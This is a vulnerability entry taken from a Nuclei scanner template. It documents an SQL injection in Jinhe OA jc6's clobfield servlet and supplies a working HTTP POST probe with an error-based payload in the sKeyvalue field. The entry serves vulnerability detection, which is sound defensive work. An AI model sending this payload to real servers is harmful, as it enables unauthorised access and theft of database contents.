# Nuclei Template: Jinhe OA - SQL Injection
**Template ID:** jinhe-jc6-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`jinhe-jc6-sqli.yaml`)

## Vulnerability Information & PoC

## Description
SQL injection vulnerability in the ljc6/servlet/clobfield interface of Jinhe OA jc6. An attacker can obtain sensitive information.

## Steps to reproduce / Exploit Payload
```http
POST /jc6/servlet/clobfield HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11' and CONVERT(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27{{num}}%27))))=1 and ''='
```

## References
- https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA%20jc6%20clobfield%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
- https://blog.csdn.net/qq_41904294/article/details/135074649
